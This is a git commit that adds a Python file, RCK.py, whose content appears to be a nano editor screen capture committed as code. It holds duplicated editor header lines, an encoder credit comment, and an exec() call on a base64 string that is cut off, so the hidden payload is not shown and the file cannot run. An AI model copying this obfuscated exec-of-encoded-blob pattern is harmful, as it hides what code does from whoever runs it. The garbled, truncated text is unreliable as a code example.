acf066441c929b4afb2c66975a90e0f576bfe6da
MD Rakibul Islam <96944832+broken-hart@users.noreply.github.com>
2022-05-12 21:52:50 +0600

    Add files via upload

---
+++ RCK.py
@@ -0,0 +1,7 @@
+GNU nano 6.3                 RCK.py
+GNU nano 6.3                 RCK.py
+# #ENCODE_BY_QAISER_YT_TECH_QAISER
+
+
+import base64
+exec(base64.b64decode('IyBEZWNvbXBpbGUgYnkgTWFyZGlzIChUb29scyBC>
